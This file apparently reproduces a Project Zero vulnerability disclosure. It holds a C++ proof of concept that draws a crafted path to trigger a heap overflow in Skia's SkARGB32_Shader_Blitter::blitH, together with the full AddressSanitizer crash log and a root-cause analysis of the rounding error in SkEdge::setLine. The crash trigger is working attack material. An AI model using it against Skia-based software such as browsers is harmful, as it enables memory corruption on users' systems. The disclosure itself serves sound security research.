@@ -1,0 +1,133 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1155
+
+Skia bug: https://bugs.chromium.org/p/skia/issues/detail?id=6294
+
+There is a heap overflow in SkARGB32_Shader_Blitter::blitH caused by a rounding error in SkEdge::setLine. To trigger the bug Skia needs to be compiled with SK_RASTERIZE_EVEN_ROUNDING (true in, for example, Mozilla Firefox).
+
+To demonstrate the bug, compile (with SK_RASTERIZE_EVEN_ROUNDING defined) and run the following Proof of Concept:
+
+=================================================================
+*/
+
+#include "SkCanvas.h"
+#include "SkPath.h"
+#include "SkGradientShader.h"
+
+
+int main (int argc, char * const argv[]) {
+
+    SkBitmap bitmap;
+    bitmap.allocN32Pixels(1128, 500);
+
+    //Create Canvas
+    SkCanvas canvas(bitmap);
+
+    SkColor colors[2] = {SkColorSetARGB(10,0,0,0), SkColorSetARGB(10,255,255,255)};
+    SkPoint points[2] = {
+       SkPoint::Make(0.0f, 0.0f),
+       SkPoint::Make(256.0f, 256.0f)
+    };
+
+    SkPath path;
+    path.moveTo(1128, 0.5);
+    path.lineTo(-0.499, 100.5);
+    path.lineTo(1128, 200);
+    path.close();
+    SkPaint p;
+    p.setAntiAlias(false);
+    p.setShader(SkGradientShader::MakeLinear(
+                 points, colors, nullptr, 2,
+                 SkShader::kClamp_TileMode, 0, nullptr));
+
+    canvas.drawPath(path, p);
+
+    return 0;
+}
+
+/*
+=================================================================
+
+The PoC leads to a heap overflow in SkARGB32_Shader_Blitter::blitH (the shader and anti aliasing settings in the PoC are made specifically to select this Blitter)
+
+ASan log:
+
+=================================================================
+==46341==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62100001dea0 at pc 0x00000079d6d1 bp 0x7ffecd6a42c0 sp 0x7ffecd6a42b8
+WRITE of size 4 at 0x62100001dea0 thread T0
+    #0 0x79d6d0 in sk_memset32(unsigned int*, unsigned int, int) /home/ifratric/skia/skia/out/asan/../../src/core/SkUtils.cpp:18:19
+    #1 0x8025f1 in SkLinearGradient::LinearGradientContext::shade4_clamp(int, int, unsigned int*, int) /home/ifratric/skia/skia/out/asan/../../src/effects/gradients/SkLinearGradient.cpp:842:13
+    #2 0x802219 in SkLinearGradient::LinearGradientContext::shadeSpan(int, int, unsigned int*, int) /home/ifratric/skia/skia/out/asan/../../src/effects/gradients/SkLinearGradient.cpp:349:9
+    #3 0xc946f7 in SkARGB32_Shader_Blitter::blitH(int, int, int) /home/ifratric/skia/skia/out/asan/../../src/core/SkBlitter_ARGB32.cpp:384:9
+    #4 0x779484 in walk_convex_edges(SkEdge*, SkPath::FillType, SkBlitter*, int, int, void (*)(SkBlitter*, int, bool)) /home/ifratric/skia/skia/out/asan/../../src/core/SkScan_Path.cpp:295:21
+    #5 0x778107 in sk_fill_path(SkPath const&, SkIRect const&, SkBlitter*, int, int, int, bool) /home/ifratric/skia/skia/out/asan/../../src/core/SkScan_Path.cpp:508:9
+    #6 0x77afe3 in SkScan::FillPath(SkPath const&, SkRegion const&, SkBlitter*) /home/ifratric/skia/skia/out/asan/../../src/core/SkScan_Path.cpp:707:9
+    #7 0x765792 in SkScan::FillPath(SkPath const&, SkRasterClip const&, SkBlitter*) /home/ifratric/skia/skia/out/asan/../../src/core/SkScan_AntiPath.cpp:745:9
+    #8 0x632690 in SkDraw::drawDevPath(SkPath const&, SkPaint const&, bool, SkBlitter*, bool) const /home/ifratric/skia/skia/out/asan/../../src/core/SkDraw.cpp:1072:5
+    #9 0x63321c in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool, bool, SkBlitter*) const /home/ifratric/skia/skia/out/asan/../../src/core/SkDraw.cpp:1165:5
+    #10 0xc5c5b3 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) const /home/ifratric/skia/skia/out/asan/../../src/core/SkDraw.h:54:9
+    #11 0xc5c5b3 in SkBitmapDevice::drawPath(SkDraw const&, SkPath const&, SkPaint const&, SkMatrix const*, bool) /home/ifratric/skia/skia/out/asan/../../src/core/SkBitmapDevice.cpp:243
+    #12 0x51f6b8 in SkCanvas::onDrawPath(SkPath const&, SkPaint const&) /home/ifratric/skia/skia/out/asan/../../src/core/SkCanvas.cpp:2379:9
+    #13 0x4f805d in main /home/ifratric/skia/skia/out/asan/../../crash.cpp:34:5
+    #14 0x7f64ed80f82f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291
+    #15 0x426788 in _start (/home/ifratric/skia/skia/out/asan/crash+0x426788)
+
+0x62100001dea0 is located 0 bytes to the right of 4512-byte region [0x62100001cd00,0x62100001dea0)
+allocated by thread T0 here:
+    #0 0x4c6728 in __interceptor_malloc (/home/ifratric/skia/skia/out/asan/crash+0x4c6728)
+    #1 0x7e3d38 in sk_malloc_flags(unsigned long, unsigned int) /home/ifratric/skia/skia/out/asan/../../src/ports/SkMemory_malloc.cpp:72:15
+    #2 0x7e3d38 in sk_malloc_throw(unsigned long) /home/ifratric/skia/skia/out/asan/../../src/ports/SkMemory_malloc.cpp:58
+    #3 0xc8598d in SkARGB32_Shader_Blitter* SkArenaAlloc::make<SkARGB32_Shader_Blitter, SkPixmap const&, SkPaint const&, SkShader::Context*&>(SkPixmap const&, SkPaint const&, SkShader::Context*&) /home/ifratric/skia/skia/out/asan/../../src/core/SkArenaAlloc.h:94:30
+    #4 0xc8598d in SkBlitter::Choose(SkPixmap const&, SkMatrix const&, SkPaint const&, SkArenaAlloc*, bool) /home/ifratric/skia/skia/out/asan/../../src/core/SkBlitter.cpp:919
+    #5 0x632542 in SkAutoBlitterChoose::choose(SkPixmap const&, SkMatrix const&, SkPaint const&, bool) /home/ifratric/skia/skia/out/asan/../../src/core/SkDraw.cpp:69:20
+    #6 0x632542 in SkDraw::drawDevPath(SkPath const&, SkPaint const&, bool, SkBlitter*, bool) const /home/ifratric/skia/skia/out/asan/../../src/core/SkDraw.cpp:1018
+    #7 0x63321c in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool, bool, SkBlitter*) const /home/ifratric/skia/skia/out/asan/../../src/core/SkDraw.cpp:1165:5
+    #8 0xc5c5b3 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) const /home/ifratric/skia/skia/out/asan/../../src/core/SkDraw.h:54:9
+    #9 0xc5c5b3 in SkBitmapDevice::drawPath(SkDraw const&, SkPath const&, SkPaint const&, SkMatrix const*, bool) /home/ifratric/skia/skia/out/asan/../../src/core/SkBitmapDevice.cpp:243
+    #10 0x4f805d in main /home/ifratric/skia/skia/out/asan/../../crash.cpp:34:5
+    #11 0x7f64ed80f82f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /home/ifratric/skia/skia/out/asan/../../src/core/SkUtils.cpp:18:19 in sk_memset32(unsigned int*, unsigned int, int)
+Shadow bytes around the buggy address:
+  0x0c427fffbb80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c427fffbb90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c427fffbba0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c427fffbbb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c427fffbbc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0c427fffbbd0: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa
+  0x0c427fffbbe0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c427fffbbf0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c427fffbc00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c427fffbc10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c427fffbc20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==46341==ABORTING
+
+Further analysis:
+
+There is a problem in SkEdge::setLine, in particular the line with x0:-0.499900, y0:100.500000, x1:1128.000000, y1:0.500000
+After conversion to SkFDot6, the coordinates are going to become x0:72192, y0:32, x1:-32, y1:6432
+(notice how x0 got rounded to 32 == -0.5 but I don't think this is the only problem as it gets even smaller below)
+Next the line parameters are computed as follows: fFirstY:1, fLastY:100, fX:73184256, fDX:-739573
+And if you calculate fX + (fLastY-fFirstY) * fDX, you get -33471 (~ -0.51) which will get rounded to -1 in walk_convex_edges and cause an overflow.
+*/
